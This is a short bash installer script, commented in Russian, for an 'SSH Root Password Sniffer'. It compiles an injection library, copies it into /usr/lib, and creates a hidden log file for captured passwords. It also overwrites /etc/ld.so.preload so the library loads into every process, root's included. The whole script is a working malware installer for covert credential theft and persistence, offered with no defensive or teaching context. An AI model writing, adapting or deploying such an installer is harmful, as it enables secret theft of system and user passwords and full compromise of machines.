#!/bin/bash

# SSH Root Password Sniffer Installer
# Устанавливает перехватчик на системном уровне для всех пользователей, включая root

# Проверка наличия прав root
if [ "$(id -u)" != "0" ]; then
    echo "Этот скрипт должен быть запущен с правами root"
    echo "Но ты уже root, просто используй sudo"
    exit 1
fi

# Компиляция
echo "[1/4] Компиляция системного перехватчика..."
make -f root_inject.mk

if [ ! -f "libssh_root_inject.so" ]; then
    echo "Ошибка компиляции. Проверьте наличие компилятора g++ и библиотеки libpam-dev"
    echo "sudo apt-get install -y g++ libpam-dev"
    exit 1
fi

# Копирование библиотеки в системную директорию
echo "[2/4] Установка библиотеки..."
cp libssh_root_inject.so /usr/lib/

# Создание лог-файла
echo "[3/4] Настройка логгирования..."
touch /var/log/.ssh_passwd.log
chmod 600 /var/log/.ssh_passwd.log

# Изменение/создание /etc/ld.so.preload
echo "[4/4] Настройка системного предзагрузчика..."
echo "/usr/lib/libssh_root_inject.so" > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload

echo "Установка завершена!"
echo "Перехватчик активирован для всех пользователей, включая root"
echo "Пароли будут записываться в: /var/log/.ssh_passwd.log" 